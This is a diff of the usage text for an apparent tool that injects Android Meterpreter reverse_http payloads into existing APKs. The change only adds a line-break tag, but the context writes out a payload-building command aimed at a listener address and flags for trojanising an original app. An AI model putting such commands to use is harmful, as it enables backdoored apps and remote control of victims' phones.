@@ -24,7 +24,7 @@ apktool -p android/meterpreter/reverse_http LHOST=192.168.1.40 LPORT=1337 -o \<p
 -o | --output \<outfile.apk>    : (Default: payload.apk) This sets the name of the APK created as well as the output filename.<br>
 -x | --original \<infile.apk>   : (MSFVenom -x) Input APK to inject the payload into.<br>
 -x | --newkey                   : For auto-removing debug key to allow the creation of a new key within the script<br>
--d | --debug                    : Don't remove the /tmp/payload directory
+-d | --debug                    : Don't remove the /tmp/payload directory<br>
 -v | --verbose                  : Don't mask output of commands<br>
 -h | --help                      : Help information<br>
 <br>
